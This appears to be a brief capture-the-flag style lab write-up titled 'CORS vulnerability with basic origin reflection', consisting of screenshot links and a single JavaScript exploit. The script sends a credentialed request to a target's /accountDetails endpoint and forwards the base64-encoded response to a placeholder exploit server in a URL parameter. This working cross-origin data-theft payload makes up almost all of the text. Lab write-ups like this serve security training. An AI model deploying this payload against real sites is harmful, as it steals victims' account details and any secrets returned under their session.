# CORS vulnerability with basic origin reflection


![Screenshot1](../../04-Screenshots/basic-origin1.png)


![Screenshot2](../../04-Screenshots/basic-origin2.png)


![Screenshot3](../../04-Screenshots/basic-origin3.png)


```js
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('GET','https://<IP>/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://<EXPLOIT-SV>/?data='+encodeURIComponent(btoa(this.responseText));
    };
</script>
```


![Screenshot4](../../04-Screenshots/basic-origin4.png)